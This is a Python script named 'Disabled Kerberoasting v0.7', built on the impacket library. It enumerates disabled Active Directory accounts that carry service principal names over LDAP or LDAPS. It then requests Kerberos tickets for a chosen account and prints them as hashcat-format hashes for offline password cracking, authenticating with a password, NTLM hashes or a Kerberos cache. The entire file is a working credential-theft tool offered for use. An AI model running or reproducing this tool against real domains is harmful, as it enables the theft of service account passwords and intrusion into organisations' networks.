#!/usr/bin/env python3
# Disabled Kerberoasting v0.7 - LDAPS/Signing support
import warnings
warnings.filterwarnings("ignore", message=".*pkg_resources is deprecated as an API.*", category=UserWarning)
import argparse, inspect, sys, os, ssl
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.ntlm import compute_nthash
from impacket import version
from impacket.ldap import ldap as impacket_ldap
from impacket.ldap import ldapasn1 as ldapasn1
from pyasn1.codec.der import decoder
from impacket.krb5.asn1 import AS_REP, TGS_REP
import datetime

def setArguments():
    args = argparse.ArgumentParser()
    args.add_argument("-d", "--domain", required=True, help="domain")
    args.add_argument("-u", "--username", required=True, help="user name")
    args.add_argument("-p", "--password", required=False, default='', help="user password")
    args.add_argument("-dc-ip", required=True, help="domain controller address")
    args.add_argument("--request-user", help="specify target account name", required=False)
    args.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication (ccache)")
    args.add_argument("-hashes", metavar="LMHASH:NTHASH", help="NTLM hashes (LM:NT or :NT)")
    args.add_argument("-no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    args.add_argument("-ssl", action="store_true", help="Use LDAPS (SSL)")
    
    args = args.parse_args()
    
    return (args.domain, args.username, args.password, args.dc_ip, 
            args.request_user, args.kerberos, args.hashes, args.no_pass, args.ssl)

def filetime_to_dt(ft):
    if isinstance(ft, (bytes, bytearray)):
        try:
            ft_int = int(ft.decode(errors="ignore"))
        except:
            ft_int = 0
    elif isinstance(ft, str):
        try:
            ft_int = int(ft)
        except:
            ft_int = 0
    elif isinstance(ft, int):
        ft_int = ft
    else:
        ft_int = 0
    try:
        micros = ft_int // 10
        epoch = datetime.datetime(1601, 1, 1)
        return epoch + datetime.timedelta(microseconds=micros)
    except:
        return datetime.datetime(1601, 1, 1)

def getDisabledAccounts(domain, user, password, dc_ip, use_kerberos=False, lmhash='', nthash='', use_ssl=False):
    base_dn = ",".join(f"DC={part}" for part in domain.split("."))
    
    try:
        if use_ssl:
            # LDAPS (포트 636)
            ldap_conn = impacket_ldap.LDAPConnection(f'ldaps://{dc_ip}', base_dn, dc_ip)
        else:
            # 일반 LDAP
            ldap_conn = impacket_ldap.LDAPConnection(f'ldap://{dc_ip}', base_dn, dc_ip)
        
        if use_kerberos:
            # Kerberos 인증 (signing 자동)
            ldap_conn.kerberosLogin(user, password, domain, lmhash, nthash, kdcHost=dc_ip)
        else:
            # NTLM 인증
            ldap_conn.login(user, password, domain, lmhash, nthash)
            
    except Exception as e:
        print(f"[-] LDAP connection error: {e}")
        return []
    
    search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(servicePrincipalName=*)(!(sAMAccountName=*$)))"
    
    try:
        resp = ldap_conn.search(
            searchBase=base_dn,
            searchFilter=search_filter,
            attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf', 'pwdLastSet', 'lastLogon', 'msDS-AllowedToDelegateTo']
        )
    except Exception as e:
        print(f"[-] LDAP search error: {e}")
        return []
    
    searchResults = []
    
    for item in resp:
        if not isinstance(item, ldapasn1.SearchResultEntry):
            continue
        
        entry = {}
        try:
            for attr in item['attributes']:
                attr_type = str(attr['type'])
                attr_vals = [str(val) for val in attr['vals']]
                entry[attr_type] = attr_vals
        except:
            continue
        
        sam = entry.get('sAMAccountName', [''])[0]
        if sam == 'krbtgt' or sam.endswith('$'):
            continue
        
        spns = entry.get('servicePrincipalName', [])
        memberOf = entry.get('memberOf', [])
        pwdLastSet = entry.get('pwdLastSet', ['0'])[0]
        lastLogon = entry.get('lastLogon', ['0'])[0]
        delegation = entry.get('msDS-AllowedToDelegateTo', [])
        
        searchResults.append([
            sam.encode(),
            [s.encode() for s in spns],
            [m.encode() for m in memberOf],
            pwdLastSet.encode(),
            lastLogon.encode(),
            [d.encode() for d in delegation]
        ])
    
    return searchResults

def printResults(searchResults):
    headers = ["ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon", "Delegation"]
    col_width = {h: len(h) for h in headers}
    rows = []
    
    for entry in searchResults:
        sam, spns, memberOf, pwd_last_set, last_logon, delegation = entry
        
        pwd_str = filetime_to_dt(pwd_last_set).strftime("%Y-%m-%d %H:%M:%S")
        logon_str = filetime_to_dt(last_logon).strftime("%Y-%m-%d %H:%M:%S")
        sam_str = sam.decode() if isinstance(sam, bytes) else str(sam)
        member_str = ", ".join([m.decode() if isinstance(m, bytes) else str(m) for m in memberOf])
        deleg_str = ", ".join([d.decode() if isinstance(d, bytes) else str(d) for d in delegation])

        for sp in (spns if isinstance(spns, list) else [spns]):
            spn_str = sp.decode() if isinstance(sp, bytes) else str(sp)
            rows.append([spn_str, sam_str, member_str, pwd_str, logon_str, deleg_str])

    if not rows:
        print("[-] There is no result.")
        return

    for r in rows:
        for i, cell in enumerate(r):
            col_width[headers[i]] = max(col_width[headers[i]], len(cell))

    print('\n')
    print("  ".join(h.ljust(col_width[h]) for h in headers))
    print("  ".join("-" * col_width[h] for h in headers))
    for r in rows:
        print("  ".join(r[i].ljust(col_width[headers[i]]) for i in range(len(headers))))

def sendAsReq(domain, user, password, dc_ip, target, use_kerberos=False, lmhash='', nthash=''):
    print('')
    realm = domain.upper()
    cname = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    kw = {"kdcHost": dc_ip}
    
    if use_kerberos:
        ccache_file = os.environ.get('KRB5CCNAME', '')
        if not ccache_file or not os.path.exists(ccache_file):
            sys.exit(f"[-] Kerberos ccache not found. Set KRB5CCNAME environment variable.")
        
        ccache = CCache.loadFile(ccache_file)
        tgt = ccache.getCredential(f'krbtgt/{realm}@{realm}')
        if tgt is None:
            sys.exit(f"[-] No TGT found in ccache for {realm}")
        
        tgt_data = tgt.toTGT()
        sname = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs_tup = getKerberosTGS(sname, realm, dc_ip, tgt_data, tgt_data['cipher'], tgt_data['sessionKey'])
        
        asn1_rep, _ = decoder.decode(tgs_tup[0], asn1Spec=TGS_REP())
        cipher_bytes = bytes(asn1_rep['ticket']['enc-part']['cipher'])
        hc = f"$krb5tgs$23$*{target}${realm}${domain}/{target}*${cipher_bytes.hex()[:32]}${cipher_bytes.hex()[32:]}"
        print(hc)
        return
    
    if nthash:
        kw["lmhash"], kw["nthash"], kw["aesKey"] = lmhash, nthash, ''
    else:
        kw["lmhash"], kw["nthash"], kw["aesKey"] = '', compute_nthash(password), ''

    sig = inspect.signature(getKerberosTGT).parameters
    sname = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
    if "serverName" in sig:
        kw["serverName"] = sname
    elif "targetName" in sig:
        kw["targetName"] = sname
    else:
        sys.exit("This impacket build does not support -target flag.")

    asResponse = getKerberosTGT(cname, password, realm, **kw)
    asn1_rep, _ = decoder.decode(asResponse[0], asn1Spec=AS_REP())
    cipher_bytes = bytes(asn1_rep['ticket']['enc-part']['cipher'])
    hc = f"$krb5tgs$23$*{target}${realm}${domain}/{target}*${cipher_bytes.hex()[:32]}${cipher_bytes.hex()[32:]}"
    print(hc)

def main():
    domain, user, password, dc_ip, target, use_kerberos, hashes, no_pass, use_ssl = setArguments()
    
    lmhash, nthash = '', ''
    if hashes:
        lmhash, nthash = (hashes.split(':') + [''])[:2]

    if not use_kerberos and not password and not nthash and not no_pass:
        print("[-] No authentication method provided. Use -p, -hashes, or -k")
        sys.exit(1)

    if target:
        sendAsReq(domain, user, password, dc_ip, target, use_kerberos, lmhash, nthash)
    else:
        searchResults = getDisabledAccounts(domain, user, password, dc_ip, use_kerberos, lmhash, nthash, use_ssl)
        printResults(searchResults)

if __name__ == "__main__":
    version.BANNER = ""
    try:
        print(f'Disabled Kerberoasting v0.7 - Copyright 2025 mick3y')
        main()
    except Exception as e:
        sys.exit(f"[-] {e}")
